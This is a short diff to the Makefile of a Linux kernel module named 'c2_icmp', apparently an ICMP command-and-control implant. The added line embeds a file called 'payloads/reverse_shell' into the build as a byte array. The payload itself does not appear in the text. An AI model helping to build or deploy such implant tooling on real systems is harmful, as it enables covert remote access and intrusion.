@@ -5,6 +5,7 @@
 
 obj-m = c2_icmp.o
 KERNEL_VERSION = $(shell uname -r)
+BYTE_ARR = $(shell xxd -i payloads/reverse_shell)
 all:
 	make -C /lib/modules/$(KERNEL_VERSION)/build M=$(PWD) modules
 
